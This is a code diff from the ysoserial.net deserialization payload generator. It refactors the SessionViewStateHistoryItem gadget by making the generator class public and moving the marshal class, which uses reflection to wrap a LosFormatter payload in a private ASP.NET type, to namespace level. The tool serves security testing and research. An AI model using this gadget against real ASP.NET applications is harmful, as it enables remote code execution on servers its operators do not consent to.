@@ -8,7 +8,7 @@ using ysoserial.Helpers;
 
 namespace ysoserial.Generators
 {
-    class SessionViewStateHistoryItemGenerator : GenericGenerator
+    public class SessionViewStateHistoryItemGenerator : GenericGenerator
     {
         public override List<string> SupportedFormatters()
         {
@@ -28,26 +28,6 @@ namespace ysoserial.Generators
         public override List<string> Labels()
         {
             return new List<string> { GadgetTypes.BridgeAndDerived };
-        }
-
-        [Serializable]
-        public class SessionViewStateHistoryItemMarshal : ISerializable
-        {
-            public SessionViewStateHistoryItemMarshal(string strB64LosFormatterPayload)
-            {
-                B64LosFormatterPayload = strB64LosFormatterPayload;
-            }
-
-            private string B64LosFormatterPayload { get; }
-
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                Type myType_SessionViewState = Type.GetType("System.Web.UI.MobileControls.SessionViewState, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
-                Type[] nestedTypes = myType_SessionViewState.GetNestedTypes(BindingFlags.NonPublic | BindingFlags.Instance);
-                info.SetType(nestedTypes[0]); // to reach the SessionViewStateHistoryItem class (private)
-                info.AddValue("s", B64LosFormatterPayload);
-
-            }
         }
 
         private string GetB64SessionToken(string b64encoded)
@@ -182,6 +162,26 @@ namespace ysoserial.Generators
             {
                 throw new Exception("Formatter not supported");
             }
+        }
+    }
+
+    [Serializable]
+    public class SessionViewStateHistoryItemMarshal : ISerializable
+    {
+        public SessionViewStateHistoryItemMarshal(string strB64LosFormatterPayload)
+        {
+            B64LosFormatterPayload = strB64LosFormatterPayload;
+        }
+
+        private string B64LosFormatterPayload { get; }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            Type myType_SessionViewState = Type.GetType("System.Web.UI.MobileControls.SessionViewState, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
+            Type[] nestedTypes = myType_SessionViewState.GetNestedTypes(BindingFlags.NonPublic | BindingFlags.Instance);
+            info.SetType(nestedTypes[0]); // to reach the SessionViewStateHistoryItem class (private)
+            info.AddValue("s", B64LosFormatterPayload);
+
         }
     }
 }
